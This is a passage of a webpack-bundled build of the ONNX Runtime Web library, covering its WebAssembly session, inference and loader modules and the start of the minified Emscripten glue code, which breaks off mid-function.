return \'uint64\';\n        default:\n            throw new Error(`unsupported data type: ${typeProto}`);\n    }\n};\nexports.tensorDataTypeEnumToString = tensorDataTypeEnumToString;\n/**\n * get tensor element size in bytes by the given data type\n * @returns size in integer or undefined if the data type is not supported\n */\nconst getTensorElementSize = (dateType) => [undefined, 4, 1, 1, 2, 2, 4, 8, undefined, 1, 2, 8, 4, 8, undefined, undefined, undefined][dateType];\nexports.getTensorElementSize = getTensorElementSize;\n/**\n * get typed array constructor by the given tensor type\n */\nconst tensorTypeToTypedArrayConstructor = (type) => {\n    switch (type) {\n        case \'float16\':\n            return Uint16Array;\n        case \'float32\':\n            return Float32Array;\n        case \'uint8\':\n            return Uint8Array;\n        case \'int8\':\n            return Int8Array;\n        case \'uint16\':\n            return Uint16Array;\n        case \'int16\':\n            return Int16Array;\n        case \'int32\':\n            return Int32Array;\n        case \'bool\':\n            return Uint8Array;\n        case \'float64\':\n            return Float64Array;\n        case \'uint32\':\n            return Uint32Array;\n        case \'int64\':\n            return BigInt64Array;\n        case \'uint64\':\n            return BigUint64Array;\n        default:\n            throw new Error(`unsupported type: ${type}`);\n    }\n};\nexports.tensorTypeToTypedArrayConstructor = tensorTypeToTypedArrayConstructor;\n/**\n * Map string log level to integer value\n */\nconst logLevelStringToEnum = (logLevel) => {\n    switch (logLevel) {\n        case \'verbose\':\n            return 0;\n        case \'info\':\n            return 1;\n        case \'warning\':\n            return 2;\n        case \'error\':\n            return 3;\n        case \'fatal\':\n            return 4;\n        default:\n            throw new Error(`unsupported logging level: ${logLevel}`);\n    }\n};\nexports.logLevelStringToEnum = logLevelStringToEnum;\n\n\n/***/ }),\n\n/***/ "./lib/wasm/wasm-core-impl.ts":\n/*!************************************!*\\\n  !*** ./lib/wasm/wasm-core-impl.ts ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, exports, __webpack_require__) => {\n\n"use strict";\n\n// Copyright (c) Microsoft Corporation. All rights reserved.\n// Licensed under the MIT License.\nObject.defineProperty(exports, "__esModule", ({ value: true }));\nexports.extractTransferableBuffers = exports.endProfiling = exports.run = exports.releaseSession = exports.createSession = exports.createSessionFinalize = exports.createSessionAllocate = exports.initRuntime = void 0;\nconst run_options_1 = __webpack_require__(/*! ./run-options */ "./lib/wasm/run-options.ts");\nconst session_options_1 = __webpack_require__(/*! ./session-options */ "./lib/wasm/session-options.ts");\nconst wasm_common_1 = __webpack_require__(/*! ./wasm-common */ "./lib/wasm/wasm-common.ts");\nconst wasm_factory_1 = __webpack_require__(/*! ./wasm-factory */ "./lib/wasm/wasm-factory.ts");\nconst wasm_utils_1 = __webpack_require__(/*! ./wasm-utils */ "./lib/wasm/wasm-utils.ts");\n/**\n * get the input/output count of the session.\n * @param sessionHandle the handle representing the session. should be non-zero.\n * @returns a tuple including 2 numbers, representing the input count and output count.\n */\nconst getSessionInputOutputCount = (sessionHandle) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    const stack = wasm.stackSave();\n    try {\n        const dataOffset = wasm.stackAlloc(8);\n        const errorCode = wasm._OrtGetInputOutputCount(sessionHandle, dataOffset, dataOffset + 4);\n        if (errorCode !== 0) {\n            (0, wasm_utils_1.checkLastError)(\'Can\\\'t get session input/output count.\');\n        }\n        return [wasm.HEAP32[dataOffset / 4], wasm.HEAP32[dataOffset / 4 + 1]];\n    }\n    finally {\n        wasm.stackRestore(stack);\n    }\n};\n/**\n * initialize ORT environment.\n * @param numThreads SetGlobalIntraOpNumThreads(numThreads)\n * @param loggingLevel CreateEnv(static_cast<OrtLoggingLevel>(logging_level))\n */\nconst initOrt = (numThreads, loggingLevel) => {\n    const errorCode = (0, wasm_factory_1.getInstance)()._OrtInit(numThreads, loggingLevel);\n    if (errorCode !== 0) {\n        (0, wasm_utils_1.checkLastError)(\'Can\\\'t initialize onnxruntime.\');\n    }\n};\n/**\n * intialize runtime environment.\n * @param env passed in the environment config object.\n */\nconst initRuntime = async (env) => {\n    // init ORT\n    initOrt(env.wasm.numThreads, (0, wasm_common_1.logLevelStringToEnum)(env.logLevel));\n    if (false) {}\n};\nexports.initRuntime = initRuntime;\nconst activeSessions = new Map();\n/**\n * allocate the memory and memcpy the model bytes, preparing for creating an instance of InferenceSession.\n * @returns a 2-elements tuple - the pointer and size of the allocated buffer\n */\nconst createSessionAllocate = (model) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    const modelDataOffset = wasm._malloc(model.byteLength);\n    if (modelDataOffset === 0) {\n        throw new Error(`Can\'t create a session. failed to allocate a buffer of size ${model.byteLength}.`);\n    }\n    wasm.HEAPU8.set(model, modelDataOffset);\n    return [modelDataOffset, model.byteLength];\n};\nexports.createSessionAllocate = createSessionAllocate;\n/**\n * create an inference session using the prepared buffer containing the model data.\n * @param modelData a 2-elements tuple containing the pointer and size of the model data buffer.\n * @param options an optional session options object.\n * @returns a 3-elements tuple containing [session handle, input names, output names]\n */\nconst createSessionFinalize = (modelData, options) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    let sessionHandle = 0;\n    let sessionOptionsHandle = 0;\n    let allocs = [];\n    const inputNamesUTF8Encoded = [];\n    const outputNamesUTF8Encoded = [];\n    try {\n        [sessionOptionsHandle, allocs] = (0, session_options_1.setSessionOptions)(options);\n        sessionHandle = wasm._OrtCreateSession(modelData[0], modelData[1], sessionOptionsHandle);\n        if (sessionHandle === 0) {\n            (0, wasm_utils_1.checkLastError)(\'Can\\\'t create a session.\');\n        }\n        const [inputCount, outputCount] = getSessionInputOutputCount(sessionHandle);\n        const inputNames = [];\n        const outputNames = [];\n        for (let i = 0; i < inputCount; i++) {\n            const name = wasm._OrtGetInputName(sessionHandle, i);\n            if (name === 0) {\n                (0, wasm_utils_1.checkLastError)(\'Can\\\'t get an input name.\');\n            }\n            inputNamesUTF8Encoded.push(name);\n            inputNames.push(wasm.UTF8ToString(name));\n        }\n        for (let i = 0; i < outputCount; i++) {\n            const name = wasm._OrtGetOutputName(sessionHandle, i);\n            if (name === 0) {\n                (0, wasm_utils_1.checkLastError)(\'Can\\\'t get an output name.\');\n            }\n            outputNamesUTF8Encoded.push(name);\n            outputNames.push(wasm.UTF8ToString(name));\n        }\n        activeSessions.set(sessionHandle, [sessionHandle, inputNamesUTF8Encoded, outputNamesUTF8Encoded]);\n        return [sessionHandle, inputNames, outputNames];\n    }\n    catch (e) {\n        inputNamesUTF8Encoded.forEach(buf => wasm._OrtFree(buf));\n        outputNamesUTF8Encoded.forEach(buf => wasm._OrtFree(buf));\n        if (sessionHandle !== 0) {\n            wasm._OrtReleaseSession(sessionHandle);\n        }\n        throw e;\n    }\n    finally {\n        wasm._free(modelData[0]);\n        if (sessionOptionsHandle !== 0) {\n            wasm._OrtReleaseSessionOptions(sessionOptionsHandle);\n        }\n        allocs.forEach(alloc => wasm._free(alloc));\n    }\n};\nexports.createSessionFinalize = createSessionFinalize;\n/**\n * create an instance of InferenceSession.\n * @returns the metadata of InferenceSession. 0-value handle for failure.\n */\nconst createSession = (model, options) => {\n    const modelData = (0, exports.createSessionAllocate)(model);\n    return (0, exports.createSessionFinalize)(modelData, options);\n};\nexports.createSession = createSession;\nconst releaseSession = (sessionId) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    const session = activeSessions.get(sessionId);\n    if (!session) {\n        throw new Error(`cannot release session. invalid session id: ${sessionId}`);\n    }\n    const [sessionHandle, inputNamesUTF8Encoded, outputNamesUTF8Encoded] = session;\n    inputNamesUTF8Encoded.forEach(buf => wasm._OrtFree(buf));\n    outputNamesUTF8Encoded.forEach(buf => wasm._OrtFree(buf));\n    wasm._OrtReleaseSession(sessionHandle);\n    activeSessions.delete(sessionId);\n};\nexports.releaseSession = releaseSession;\n/**\n * perform inference run\n */\nconst run = async (sessionId, inputIndices, inputs, outputIndices, options) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    const session = activeSessions.get(sessionId);\n    if (!session) {\n        throw new Error(`cannot run inference. invalid session id: ${sessionId}`);\n    }\n    const [sessionHandle, inputNamesUTF8Encoded, outputNamesUTF8Encoded] = session;\n    const inputCount = inputIndices.length;\n    const outputCount = outputIndices.length;\n    let runOptionsHandle = 0;\n    let runOptionsAllocs = [];\n    const inputValues = [];\n    const inputAllocs = [];\n    try {\n        [runOptionsHandle, runOptionsAllocs] = (0, run_options_1.setRunOptions)(options);\n        // create input tensors\n        for (let i = 0; i < inputCount; i++) {\n            const dataType = inputs[i][0];\n            const dims = inputs[i][1];\n            const data = inputs[i][2];\n            let dataOffset;\n            let dataByteLength;\n            if (Array.isArray(data)) {\n                // string tensor\n                dataByteLength = 4 * data.length;\n                dataOffset = wasm._malloc(dataByteLength);\n                inputAllocs.push(dataOffset);\n                let dataIndex = dataOffset / 4;\n                for (let i = 0; i < data.length; i++) {\n                    if (typeof data[i] !== \'string\') {\n                        throw new TypeError(`tensor data at index ${i} is not a string`);\n                    }\n                    wasm.HEAPU32[dataIndex++] = (0, wasm_utils_1.allocWasmString)(data[i], inputAllocs);\n                }\n            }\n            else {\n                dataByteLength = data.byteLength;\n                dataOffset = wasm._malloc(dataByteLength);\n                inputAllocs.push(dataOffset);\n                wasm.HEAPU8.set(new Uint8Array(data.buffer, data.byteOffset, dataByteLength), dataOffset);\n            }\n            const stack = wasm.stackSave();\n            const dimsOffset = wasm.stackAlloc(4 * dims.length);\n            try {\n                let dimIndex = dimsOffset / 4;\n                dims.forEach(d => wasm.HEAP32[dimIndex++] = d);\n                const tensor = wasm._OrtCreateTensor((0, wasm_common_1.tensorDataTypeStringToEnum)(dataType), dataOffset, dataByteLength, dimsOffset, dims.length);\n                if (tensor === 0) {\n                    (0, wasm_utils_1.checkLastError)(`Can\'t create tensor for input[${i}].`);\n                }\n                inputValues.push(tensor);\n            }\n            finally {\n                wasm.stackRestore(stack);\n            }\n        }\n        const beforeRunStack = wasm.stackSave();\n        const inputValuesOffset = wasm.stackAlloc(inputCount * 4);\n        const inputNamesOffset = wasm.stackAlloc(inputCount * 4);\n        const outputValuesOffset = wasm.stackAlloc(outputCount * 4);\n        const outputNamesOffset = wasm.stackAlloc(outputCount * 4);\n        try {\n            let inputValuesIndex = inputValuesOffset / 4;\n            let inputNamesIndex = inputNamesOffset / 4;\n            let outputValuesIndex = outputValuesOffset / 4;\n            let outputNamesIndex = outputNamesOffset / 4;\n            for (let i = 0; i < inputCount; i++) {\n                wasm.HEAPU32[inputValuesIndex++] = inputValues[i];\n                wasm.HEAPU32[inputNamesIndex++] = inputNamesUTF8Encoded[inputIndices[i]];\n            }\n            for (let i = 0; i < outputCount; i++) {\n                wasm.HEAPU32[outputValuesIndex++] = 0;\n                wasm.HEAPU32[outputNamesIndex++] = outputNamesUTF8Encoded[outputIndices[i]];\n            }\n            // support RunOptions\n            let errorCode = wasm._OrtRun(sessionHandle, inputNamesOffset, inputValuesOffset, inputCount, outputNamesOffset, outputCount, outputValuesOffset, runOptionsHandle);\n            // eslint-disable-next-line @typescript-eslint/naming-convention\n            const runPromise = wasm.jsepRunPromise;\n            if (runPromise && typeof runPromise.then !== \'undefined\') {\n                errorCode = await runPromise;\n            }\n            const output = [];\n            if (errorCode !== 0) {\n                (0, wasm_utils_1.checkLastError)(\'failed to call OrtRun().\');\n            }\n            for (let i = 0; i < outputCount; i++) {\n                const tensor = wasm.HEAPU32[outputValuesOffset / 4 + i];\n                const beforeGetTensorDataStack = wasm.stackSave();\n                // stack allocate 4 pointer value\n                const tensorDataOffset = wasm.stackAlloc(4 * 4);\n                let type, dataOffset = 0;\n                try {\n                    errorCode = wasm._OrtGetTensorData(tensor, tensorDataOffset, tensorDataOffset + 4, tensorDataOffset + 8, tensorDataOffset + 12);\n                    if (errorCode !== 0) {\n                        (0, wasm_utils_1.checkLastError)(`Can\'t access output tensor data on index ${i}.`);\n                    }\n                    let tensorDataIndex = tensorDataOffset / 4;\n                    const dataType = wasm.HEAPU32[tensorDataIndex++];\n                    dataOffset = wasm.HEAPU32[tensorDataIndex++];\n                    const dimsOffset = wasm.HEAPU32[tensorDataIndex++];\n                    const dimsLength = wasm.HEAPU32[tensorDataIndex++];\n                    const dims = [];\n                    for (let i = 0; i < dimsLength; i++) {\n                        dims.push(wasm.HEAPU32[dimsOffset / 4 + i]);\n                    }\n                    wasm._OrtFree(dimsOffset);\n                    const size = dims.length === 0 ? 1 : dims.reduce((a, b) => a * b);\n                    type = (0, wasm_common_1.tensorDataTypeEnumToString)(dataType);\n                    if (type === \'string\') {\n                        const stringData = [];\n                        let dataIndex = dataOffset / 4;\n                        for (let i = 0; i < size; i++) {\n                            const offset = wasm.HEAPU32[dataIndex++];\n                            const maxBytesToRead = i === size - 1 ? undefined : wasm.HEAPU32[dataIndex] - offset;\n                            stringData.push(wasm.UTF8ToString(offset, maxBytesToRead));\n                        }\n                        output.push([type, dims, stringData]);\n                    }\n                    else {\n                        const typedArrayConstructor = (0, wasm_common_1.tensorTypeToTypedArrayConstructor)(type);\n                        const data = new typedArrayConstructor(size);\n                        new Uint8Array(data.buffer, data.byteOffset, data.byteLength)\n                            .set(wasm.HEAPU8.subarray(dataOffset, dataOffset + data.byteLength));\n                        output.push([type, dims, data]);\n                    }\n                }\n                finally {\n                    wasm.stackRestore(beforeGetTensorDataStack);\n                    if (type === \'string\' && dataOffset) {\n                        wasm._free(dataOffset);\n                    }\n                    wasm._OrtReleaseTensor(tensor);\n                }\n            }\n            return output;\n        }\n        finally {\n            wasm.stackRestore(beforeRunStack);\n        }\n    }\n    finally {\n        inputValues.forEach(v => wasm._OrtReleaseTensor(v));\n        inputAllocs.forEach(p => wasm._free(p));\n        if (runOptionsHandle !== 0) {\n            wasm._OrtReleaseRunOptions(runOptionsHandle);\n        }\n        runOptionsAllocs.forEach(p => wasm._free(p));\n    }\n};\nexports.run = run;\n/**\n * end profiling\n */\nconst endProfiling = (sessionId) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    const session = activeSessions.get(sessionId);\n    if (!session) {\n        throw new Error(\'invalid session id\');\n    }\n    const sessionHandle = session[0];\n    // profile file name is not used yet, but it must be freed.\n    const profileFileName = wasm._OrtEndProfiling(sessionHandle);\n    if (profileFileName === 0) {\n        (0, wasm_utils_1.checkLastError)(\'Can\\\'t get an profile file name.\');\n    }\n    wasm._OrtFree(profileFileName);\n};\nexports.endProfiling = endProfiling;\nconst extractTransferableBuffers = (tensors) => {\n    const buffers = [];\n    for (const tensor of tensors) {\n        const data = tensor[2];\n        if (!Array.isArray(data) && data.buffer) {\n            buffers.push(data.buffer);\n        }\n    }\n    return buffers;\n};\nexports.extractTransferableBuffers = extractTransferableBuffers;\n\n\n/***/ }),\n\n/***/ "./lib/wasm/wasm-factory.ts":\n/*!**********************************!*\\\n  !*** ./lib/wasm/wasm-factory.ts ***!\n  \\**********************************/\n/***/ (function(__unused_webpack_module, exports, __webpack_require__) {\n\n"use strict";\n\n// Copyright (c) Microsoft Corporation. All rights reserved.\n// Licensed under the MIT License.\nvar __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    var desc = Object.getOwnPropertyDescriptor(m, k);\n    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {\n      desc = { enumerable: true, get: function() { return m[k]; } };\n    }\n    Object.defineProperty(o, k2, desc);\n}) : (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    o[k2] = m[k];\n}));\nvar __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {\n    Object.defineProperty(o, "default", { enumerable: true, value: v });\n}) : function(o, v) {\n    o["default"] = v;\n});\nvar __importStar = (this && this.__importStar) || function (mod) {\n    if (mod && mod.__esModule) return mod;\n    var result = {};\n    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);\n    __setModuleDefault(result, mod);\n    return result;\n};\nObject.defineProperty(exports, "__esModule", ({ value: true }));\nexports.dispose = exports.getInstance = exports.initializeWebAssembly = void 0;\nconst path = __importStar(__webpack_require__(/*! path */ "?7aa5"));\n/* eslint-disable @typescript-eslint/no-require-imports */\nconst ortWasmFactory =  true ? __webpack_require__(/*! ./binding/ort-wasm.js */ "./lib/wasm/binding/ort-wasm.js") : 0;\nconst ortWasmFactoryThreaded =  true ?\n    ( true ? __webpack_require__(/*! ./binding/ort-wasm-threaded.js */ "./lib/wasm/binding/ort-wasm-threaded.js") :\n        0) :\n    0;\n/* eslint-enable @typescript-eslint/no-require-imports */\nlet wasm;\nlet initialized = false;\nlet initializing = false;\nlet aborted = false;\nconst isMultiThreadSupported = () => {\n    try {\n        // If \'SharedArrayBuffer\' is not available, WebAssembly threads will not work.\n        if (typeof SharedArrayBuffer === \'undefined\') {\n            return false;\n        }\n        // Test for transferability of SABs (for browsers. needed for Firefox)\n        // https://groups.google.com/forum/#!msg/mozilla.dev.platform/IHkBZlHETpA/dwsMNchWEQAJ\n        if (typeof MessageChannel !== \'undefined\') {\n            new MessageChannel().port1.postMessage(new SharedArrayBuffer(1));\n        }\n        // Test for WebAssembly threads capability (for both browsers and Node.js)\n        // This typed array is a WebAssembly program containing threaded instructions.\n        return WebAssembly.validate(new Uint8Array([\n            0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 5,\n            4, 1, 3, 1, 1, 10, 11, 1, 9, 0, 65, 0, 254, 16, 2, 0, 26, 11\n        ]));\n    }\n    catch (e) {\n        return false;\n    }\n};\nconst isSimdSupported = () => {\n    try {\n        // Test for WebAssembly SIMD capability (for both browsers and Node.js)\n        // This typed array is a WebAssembly program containing SIMD instructions.\n        // The binary data is generated from the following code by wat2wasm:\n        //\n        // (module\n        //   (type $t0 (func))\n        //   (func $f0 (type $t0)\n        //     (drop\n        //       (i32x4.dot_i16x8_s\n        //         (i8x16.splat\n        //           (i32.const 0))\n        //         (v128.const i32x4 0x00000000 0x00000000 0x00000000 0x00000000)))))\n        return WebAssembly.validate(new Uint8Array([\n            0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 10, 30, 1, 28, 0, 65, 0,\n            253, 15, 253, 12, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 253, 186, 1, 26, 11\n        ]));\n    }\n    catch (e) {\n        return false;\n    }\n};\nconst getWasmFileName = (useSimd, useThreads) => {\n    if (useThreads) {\n        return useSimd ? \'ort-wasm-simd-threaded.wasm\' : \'ort-wasm-threaded.wasm\';\n    }\n    else {\n        return useSimd ? \'ort-wasm-simd.wasm\' : \'ort-wasm.wasm\';\n    }\n};\nconst initializeWebAssembly = async (flags) => {\n    if (initialized) {\n        return Promise.resolve();\n    }\n    if (initializing) {\n        throw new Error(\'multiple calls to \\\'initializeWebAssembly()\\\' detected.\');\n    }\n    if (aborted) {\n        throw new Error(\'previous call to \\\'initializeWebAssembly()\\\' failed.\');\n    }\n    initializing = true;\n    // wasm flags are already initialized\n    const timeout = flags.initTimeout;\n    const numThreads = flags.numThreads;\n    const simd = flags.simd;\n    const useThreads = numThreads > 1 && isMultiThreadSupported();\n    const useSimd = simd && isSimdSupported();\n    const wasmPaths = flags.wasmPaths;\n    const wasmPrefixOverride = typeof wasmPaths === \'string\' ? wasmPaths : undefined;\n    const wasmFileName = getWasmFileName(useSimd, useThreads);\n    const wasmPathOverride = typeof wasmPaths === \'object\' ? wasmPaths[wasmFileName] : undefined;\n    let isTimeout = false;\n    const tasks = [];\n    // promise for timeout\n    if (timeout > 0) {\n        tasks.push(new Promise((resolve) => {\n            setTimeout(() => {\n                isTimeout = true;\n                resolve();\n            }, timeout);\n        }));\n    }\n    // promise for module initialization\n    tasks.push(new Promise((resolve, reject) => {\n        const factory = useThreads ? ortWasmFactoryThreaded : ortWasmFactory;\n        const config = {\n            locateFile: (fileName, scriptDirectory) => {\n                if ( true && useThreads && fileName.endsWith(\'.worker.js\') &&\n                    typeof Blob !== \'undefined\') {\n                    return URL.createObjectURL(new Blob([\n                        // This require() function is handled by webpack to load file content of the corresponding .worker.js\n                        // eslint-disable-next-line @typescript-eslint/no-require-imports\n                        __webpack_require__(/*! ./binding/ort-wasm-threaded.worker.js */ "./lib/wasm/binding/ort-wasm-threaded.worker.js")\n                    ], { type: \'text/javascript\' }));\n                }\n                if (fileName.endsWith(\'.wasm\')) {\n                    if (wasmPathOverride) {\n                        return wasmPathOverride;\n                    }\n                    const prefix = wasmPrefixOverride !== null && wasmPrefixOverride !== void 0 ? wasmPrefixOverride : scriptDirectory;\n                    if (false) {}\n                    return prefix + wasmFileName;\n                }\n                return scriptDirectory + fileName;\n            }\n        };\n        if ( true && useThreads) {\n            if (typeof Blob === \'undefined\') {\n                config.mainScriptUrlOrBlob = path.join(__dirname, \'ort-wasm-threaded.js\');\n            }\n            else {\n                const scriptSourceCode = `var ortWasmThreaded=(function(){var _scriptDir;return ${factory.toString()}})();`;\n                config.mainScriptUrlOrBlob = new Blob([scriptSourceCode], { type: \'text/javascript\' });\n            }\n        }\n        factory(config).then(\n        // wasm module initialized successfully\n        module => {\n            initializing = false;\n            initialized = true;\n            wasm = module;\n            resolve();\n        }, \n        // wasm module failed to initialize\n        (what) => {\n            initializing = false;\n            aborted = true;\n            reject(what);\n        });\n    }));\n    await Promise.race(tasks);\n    if (isTimeout) {\n        throw new Error(`WebAssembly backend initializing failed due to timeout: ${timeout}ms`);\n    }\n};\nexports.initializeWebAssembly = initializeWebAssembly;\nconst getInstance = () => {\n    if (initialized && wasm) {\n        return wasm;\n    }\n    throw new Error(\'WebAssembly is not initialized yet.\');\n};\nexports.getInstance = getInstance;\nconst dispose = () => {\n    var _a;\n    if (initialized && !initializing && !aborted) {\n        initializing = true;\n        (_a = wasm.PThread) === null || _a === void 0 ? void 0 : _a.terminateAllThreads();\n        wasm = undefined;\n        initializing = false;\n        initialized = false;\n        aborted = true;\n    }\n};\nexports.dispose = dispose;\n\n\n/***/ }),\n\n/***/ "./lib/wasm/wasm-utils.ts":\n/*!********************************!*\\\n  !*** ./lib/wasm/wasm-utils.ts ***!\n  \\********************************/\n/***/ ((__unused_webpack_module, exports, __webpack_require__) => {\n\n"use strict";\n\n// Copyright (c) Microsoft Corporation. All rights reserved.\n// Licensed under the MIT License.\nObject.defineProperty(exports, "__esModule", ({ value: true }));\nexports.checkLastError = exports.iterateExtraOptions = exports.allocWasmString = void 0;\nconst wasm_factory_1 = __webpack_require__(/*! ./wasm-factory */ "./lib/wasm/wasm-factory.ts");\nconst allocWasmString = (data, allocs) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    const dataLength = wasm.lengthBytesUTF8(data) + 1;\n    const dataOffset = wasm._malloc(dataLength);\n    wasm.stringToUTF8(data, dataOffset, dataLength);\n    allocs.push(dataOffset);\n    return dataOffset;\n};\nexports.allocWasmString = allocWasmString;\nconst iterateExtraOptions = (options, prefix, seen, handler) => {\n    if (typeof options == \'object\' && options !== null) {\n        if (seen.has(options)) {\n            throw new Error(\'Circular reference in options\');\n        }\n        else {\n            seen.add(options);\n        }\n    }\n    Object.entries(options).forEach(([key, value]) => {\n        const name = (prefix) ? prefix + key : key;\n        if (typeof value === \'object\') {\n            (0, exports.iterateExtraOptions)(value, name + \'.\', seen, handler);\n        }\n        else if (typeof value === \'string\' || typeof value === \'number\') {\n            handler(name, value.toString());\n        }\n        else if (typeof value === \'boolean\') {\n            handler(name, (value) ? \'1\' : \'0\');\n        }\n        else {\n            throw new Error(`Can\'t handle extra config type: ${typeof value}`);\n        }\n    });\n};\nexports.iterateExtraOptions = iterateExtraOptions;\n/**\n * check web assembly API\'s last error and throw error if any error occurred.\n * @param message a message used when an error occurred.\n */\nconst checkLastError = (message) => {\n    const wasm = (0, wasm_factory_1.getInstance)();\n    const stack = wasm.stackSave();\n    try {\n        const paramsOffset = wasm.stackAlloc(8);\n        wasm._OrtGetLastError(paramsOffset, paramsOffset + 4);\n        const errorCode = wasm.HEAP32[paramsOffset / 4];\n        const errorMessagePointer = wasm.HEAPU32[paramsOffset / 4 + 1];\n        const errorMessage = errorMessagePointer ? wasm.UTF8ToString(errorMessagePointer) : \'\';\n        throw new Error(`${message} ERROR_CODE: ${errorCode}, ERROR_MESSAGE: ${errorMessage}`);\n    }\n    finally {\n        wasm.stackRestore(stack);\n    }\n};\nexports.checkLastError = checkLastError;\n\n\n/***/ }),\n\n/***/ "./lib/wasm/binding/ort-wasm-threaded.js":\n/*!***********************************************!*\\\n  !*** ./lib/wasm/binding/ort-wasm-threaded.js ***!\n  \\***********************************************/\n/***/ ((module, __unused_webpack_exports, __webpack_require__) => {\n\n\r\nvar ortWasmThreaded = (() => {\r\n  var _scriptDir = typeof document !== \'undefined\' && document.currentScript ? document.currentScript.src : undefined;\r\n  if (typeof __filename !== \'undefined\') _scriptDir = _scriptDir || __filename;\r\n  return (\r\nfunction(moduleArg = {}) {\r\n\r\nfunction aa(){d.buffer!=l.buffer&&m();return l}function n(){d.buffer!=l.buffer&&m();return ba}function p(){d.buffer!=l.buffer&&m();return ca}function r(){d.buffer!=l.buffer&&m();return da}function ea(){d.buffer!=l.buffer&&m();return fa}var w=moduleArg,ha,x;w.ready=new Promise((a,b)=>{ha=a;x=b});\r\nvar ia=Object.assign({},w),ja="./this.program",z=(a,b)=>{throw b;},ka="object"==typeof window,A="function"==typeof importScripts,B="object"==typeof process&&"object"==typeof process.versions&&"string"==typeof process.versions.node,D=w.ENVIRONMENT_IS_PTHREAD||!1,E="";function la(a){return w.locateFile?w.locateFile(a,E):E+a}var ma,F,H;\r\nif(B){var fs=__webpack_require__(/*! fs */ "?63c8"),na=__webpack_require__(/*! path */ "?75c6");E=A?na.dirname(E)+"/":__dirname+"/";ma=(b,c)=>{b=b.startsWith("file://")?new URL(b):na.normalize(b);return fs.readFileSync(b,c?void 0:"utf8")};H=b=>{b=ma(b,!0);b.buffer||(b=new Uint8Array(b));return b};F=(b,c,e,h=!0)=>{b=b.startsWith("file://")?new URL(b):na.normalize(b);fs.readFile(b,h?void 0:"utf8",(g,k)=>{g?e(g):c(h?k.buffer:k)})};!w.thisProgram&&1<process.argv.length&&(ja=process.argv[1].replace(/\\\\/g,"/"));process.argv.slice(2);z=(b,c)=>{process.exitCode=\r\nb;throw c;};w.inspect=()=>"[Emscripten Module object]";let a;try{a=__webpack_require__(/*! worker_threads */ "?c6f7")}catch(b){throw console.error(\'The "worker_threads" module is not supported in this node.js build - perhaps a newer version is needed?\'),b;}global.Worker=a.Worker}else if(ka||A)A?E=self.location.href:"undefined"!=typeof document&&document.currentScript&&(E=document.currentScript.src),_scriptDir&&(E=_scriptDir),0!==E.indexOf("blob:")?E=E.substr(0,E.replace(/[?#].*/,"").lastIndexOf("/")+1):E="",B||(ma=a=>{var b=\r\nnew XMLHttpRequest;b.open("GET",a,!1);b.send(null);return b.responseText},A&&(H=a=>{var b=new XMLHttpRequest;b.open("GET",a,!1);b.responseType="arraybuffer";b.send(null);return new Uint8Array(b.response)}),F=(a,b,c)=>{var e=new XMLHttpRequest;e.open("GET",a,!0);e.responseType="arraybuffer";e.onload=()=>{200==e.status||0==e.status&&e.response?b(e.response):c()};e.onerror=c;e.send(null)});B&&"undefined"==typeof performance&&(global.performance=(__webpack_require__(/*! perf_hooks */ "?674f").performance));\r\nvar oa=console.log.bind(console),pa=console.error.bind(console);B&&(oa=(...a)=>fs.writeSync(1,a.join(" ")+"\\n"),pa=(...a)=>fs.writeSync(2,a.join(" ")+"\\n"));var qa=w.print||oa,I=w.printErr||pa;Object.assign(w,ia);ia=null;w.thisProgram&&(ja=w.thisProgram);w.quit&&(z=w.quit);var J;w.wasmBinary&&(J=w.wasmBinary);var noExitRuntime=w.noExitRuntime||!0;"object"!=typeof WebAssembly&&K("no native wasm support detected");var d,L,ra,M=!1,N,l,ba,ca,da,fa;\r\nfunction m(){var a=d.buffer;w.HEAP8=l=new Int8Array(a);w.HEAP16=new Int16Array(a);w.HEAP32=ca=new Int32Array(a);w.HEAPU8=ba=new Uint8Array(a);w.HEAPU16=new Uint16Array(a);w.HEAPU32=da=new Uint32Array(a);w.HEAPF32=new Float32Array(a);w.HEAPF64=fa=new Float64Array(a)}var O=w.INITIAL_MEMORY||16777216;5242880<=O||K("INITIAL_MEMORY should be larger than STACK_SIZE, was "+O+"! (STACK_SIZE=5242880)");\r\nif(D)d=w.wasmMemory;else if(w.wasmMemory)d=w.wasmMemory;else if(d=new WebAssembly.Memory({initial:O/65536,maximum:65536,shared:!0}),!(d.buffer instanceof SharedArrayBuffer))throw I("requested a shared WebAssembly.Memory but the returned buffer is not a SharedArrayBuffer, indicating that while the browser has SharedArrayBuffer it does not have WebAssembly threads support - you may need to set a flag"),B&&I("(on node you may need: --experimental-wasm-threads --experimental-wasm-bulk-memory and/or recent version)"),\r\nError("bad memory");m();O=d.buffer.byteLength;var sa,ta=[],ua=[],va=[],wa=0;function P(){return noExitRuntime||0<wa}var Q=0,xa=null,R=null;function ya(){Q++;w.monitorRunDependencies&&w.monitorRunDependencies(Q)}function za(){Q--;w.monitorRunDependencies&&w.monitorRunDependencies(Q);if(0==Q&&(null!==xa&&(clearInterval(xa),xa=null),R)){var a=R;R=null;a()}}\r\nfunction K(a){if(w.onAbort)w.onAbort(a);a="Aborted("+a+")";I(a);M=!0;N=1;a=new WebAssembly.RuntimeError(a+". Build with -sASSERTIONS for more info.");x(a);throw a;}function Aa(a){return a.startsWith("data:application/octet-stream;base64,")}var S;S="ort-wasm-threaded.wasm";Aa(S)||(S=la(S));function Ba(a){if(a==S&&J)return new Uint8Array(J);if(H)return H(a);throw"both async and sync fetching of the wasm failed";}\r\nfunction 